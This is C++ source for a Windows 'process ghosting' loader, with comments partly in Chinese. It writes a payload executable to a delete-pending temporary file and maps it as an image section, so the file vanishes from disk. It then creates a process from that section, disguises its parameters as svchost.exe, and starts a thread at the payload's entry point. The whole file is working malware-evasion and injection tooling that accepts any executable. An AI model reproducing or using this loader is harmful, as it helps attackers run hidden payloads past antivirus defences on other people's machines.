#include <stdio.h>
#include <Windows.h>
#include "ghost.h"
#include <iostream>

BYTE* GetPayloadBuffer(char* shellcode,OUT size_t& p_size) {
	HANDLE hFile = CreateFileA(shellcode, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	
	p_size = GetFileSize(hFile, 0);
	BYTE* bufferAddress = (BYTE*)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	DWORD bytesRead = 0;
	if (!ReadFile(hFile, bufferAddress, p_size, &bytesRead, NULL)) {
		printf("[-] ReadFile failed. Error: %d \n",GetLastError());
		exit(-1);
	}
	CloseHandle(hFile);
	return bufferAddress;
}

HANDLE MakeSectionFromDeletePendingFile(wchar_t* ntFilePath, BYTE* payload, size_t payloadSize) {
	HANDLE hFile;
	HANDLE hSection;
	NTSTATUS status;
	_OBJECT_ATTRIBUTES objAttr;
	UNICODE_STRING uFileName;
	IO_STATUS_BLOCK statusBlock = { 0 };
	DWORD bytesWritten;
	// NT Functions Declaration
	_NtOpenFile NtOpenFile = (_NtOpenFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenFile");
	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
	_NtSetInformationFile NtSetInformationFile = (_NtSetInformationFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationFile");
	_NtCreateSection NtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");

	RtlInitUnicodeString(&uFileName, ntFilePath);
	InitializeObjectAttributes(&objAttr, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
	// Open File 
	// FLAGS
	//		FILE_SUPERSEDED: deletes the old file and creates new one if file exists
	//		FILE_SYNCHRONOUS_IO_NONALERT: All operations on the file are performed synchronously

	status = NtOpenFile(&hFile, GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
		&objAttr, &statusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE,
		FILE_SUPERSEDED | FILE_SYNCHRONOUS_IO_NONALERT);
	if (!NT_SUCCESS(status)) {
		perror("[-] Error Opening File...\n");
		exit(-1);
	}


	// Set disposition flag 
	FILE_DISPOSITION_INFORMATION fi = { 0 };
	fi.DeleteFile = TRUE;
	// Set delete-pending state to the file
	// FileDispositionInformation: Request to delete the file when it is closed
	status = NtSetInformationFile(hFile, &statusBlock, &fi, sizeof(fi), FileDispositionInformation);
	if (!NT_SUCCESS(status)) {
		perror("[-] Error setting file to delete pending state...\n");
		exit(-1);
	}

	// Write Payload To File
	// Since we've set our file to delete-pending state
	// as soon as we close the handle the file will disappear
	if (!WriteFile(hFile, payload, payloadSize, &bytesWritten, NULL)) {
		perror("[-] Failed to write payload to the file...\n");
		exit(-1);
	}


	// Before closing the handle we create a section from delete-pending file
	// This will later become the file-less section 
	// once we close the handle to the delete-pending file
	status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hFile);
	if (!NT_SUCCESS(status)) {
		perror("[-] Error setting file to delete pending state...\n");
		exit(-1);
	}

	// Close the delete-pending file handle
	// This will remove the file from the disk
	CloseHandle(hFile);
	hFile = NULL;
	return hSection;
}

HANDLE CreateProcessWithSection(HANDLE hSection) {
	HANDLE hProcess = INVALID_HANDLE_VALUE;
	NTSTATUS status;
	_NtCreateProcessEx NtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateProcessEx");

	// Create Process With File-less Section
	status = NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL,
		GetCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
	if (!NT_SUCCESS(status)) {
		perror("[-] Unable To Create The Process...\n");
		exit(-1);
	}
	return hProcess;
}


ULONG_PTR GetEntryPoint(HANDLE hProcess, BYTE* payload, PROCESS_BASIC_INFORMATION pbi) {
	BYTE image[0x1000];
	ULONG_PTR entryPoint;
	SIZE_T bytesRead;
	NTSTATUS status;

	ZeroMemory(image, sizeof(image));
	// Function Declaration
	_RtlImageNTHeader RtlImageNTheader = (_RtlImageNTHeader)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlImageNtHeader");
	_NtReadVirtualMemory NtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory");
	
	//将目标进程的peb结构信息读入内存
	status = NtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &image, sizeof(image), &bytesRead);
	if (!NT_SUCCESS(status)) {
		perror("[+] Unable to read remote process base address.. \n");
		exit(-1);
	}
	wprintf(L"[+] Base Address of target process PEB: %p \n", (ULONG_PTR)((PPEB)image)->ImageBaseAddress);
	entryPoint = (RtlImageNTheader(payload)->OptionalHeader.AddressOfEntryPoint);
	//修改OEP
	entryPoint += (ULONG_PTR)((PPEB)image)->ImageBaseAddress;
	wprintf(L"[+] EntryPoint of the payload buffer: %p \n", entryPoint);
	return entryPoint;
}


BOOL ProcessGhosting(BYTE* payload, size_t payloadSize) {
	NTSTATUS status;
	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
	_NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
	_RtlCreateProcessParametersEx RtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCreateProcessParametersEx");
	
	HANDLE hProcess = INVALID_HANDLE_VALUE;
	HANDLE hSection = INVALID_HANDLE_VALUE;
	DWORD returnLength;
	PROCESS_BASIC_INFORMATION pbi;
	ULONG_PTR entryPoint;
	UNICODE_STRING uTargetFile;
	PRTL_USER_PROCESS_PARAMETERS processParameters;

	HANDLE hThread;
	UNICODE_STRING uDllPath;
	wchar_t ntPath[MAX_PATH] = L"\\??\\";
	wchar_t tempFileName[MAX_PATH] = { 0 };
	wchar_t tempPath[MAX_PATH] = { 0 };
	GetTempPathW(MAX_PATH, tempPath);
	GetTempFileNameW(tempPath, L"PG", 0, tempFileName);
	lstrcatW(ntPath, tempFileName);
	hSection = MakeSectionFromDeletePendingFile(ntPath, payload, payloadSize);
	hProcess = CreateProcessWithSection(hSection);
	
	// 获取shellcode进程的pbi信息
	status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	if (!NT_SUCCESS(status)) {
		perror("[-] Error Getting Process Infromation!!\n");
		exit(-1);
	}
	// 获取oep
	entryPoint = GetEntryPoint(hProcess, payload, pbi);

	WCHAR targetPath[MAX_PATH];
	lstrcpyW(targetPath, L"C:\\windows\\system32\\svchost.exe");
	RtlInitUnicodeString(&uTargetFile, targetPath);
	// Create and Fix parameters for newly created process
	// Create Process Parameters
	wchar_t dllDir[] = L"C:\\Windows\\System32";
	UNICODE_STRING uDllDir = { 0 };
	RtlInitUnicodeString(&uDllPath, dllDir);
	status = RtlCreateProcessParametersEx(&processParameters, &uTargetFile, &uDllPath, NULL,
		&uTargetFile, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (!NT_SUCCESS(status)) {
		perror("[-] Unable To Create Process Parameters...\n");
		exit(-1);
	}

	// 在目标进程为参数分配内存
	PVOID paramBuffer = processParameters;
	SIZE_T paramSize = processParameters->EnvironmentSize + processParameters->MaximumLength;
	//为paramBuffer分配内存
	status = NtAllocateVirtualMemory(hProcess, &paramBuffer, 0, &paramSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!NT_SUCCESS(status)) {
		perror("[-] Unable To Allocate Memory For Process Parameters...\n");
		exit(-1);
	}
	printf("[+] Allocated Memory For Parameters %p\n", paramBuffer);
	// 将进程参数写入目标进程
	status = NtWriteVirtualMemory(hProcess, processParameters, processParameters,
	processParameters->EnvironmentSize + processParameters->MaximumLength, NULL);
	PEB* remotePEB;
	remotePEB = (PEB*)pbi.PebBaseAddress;
	// 修改目标进程peb的进程参数
	if (!WriteProcessMemory(hProcess, &remotePEB->ProcessParameters, &processParameters, sizeof(PVOID), NULL)) {
		perror("[-] Error Updating Process Parameters!!\n");
		exit(-1);
	}

	// Create Thread
	status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
		(LPTHREAD_START_ROUTINE)entryPoint, NULL, FALSE, 0, 0, 0, NULL);
	if (!NT_SUCCESS(status)) {
		std::cerr << "[-] Error Creating Thread: " << std::hex << status << std::endl;
		exit(-1);
	}


	return TRUE;
}

int main(int argc,char* argv[]) {
	if (argc != 2) {
		printf("[+]Usage: ghost.exe C:\\windows\\system32\\calc.exe.\n");
		return -1;
	}
	size_t payloadSize = 0;
	BYTE* payloadBuffer = GetPayloadBuffer(argv[1],payloadSize);
	ProcessGhosting(payloadBuffer, payloadSize);
	printf("[+] Inject successfully.");
	return 0;

}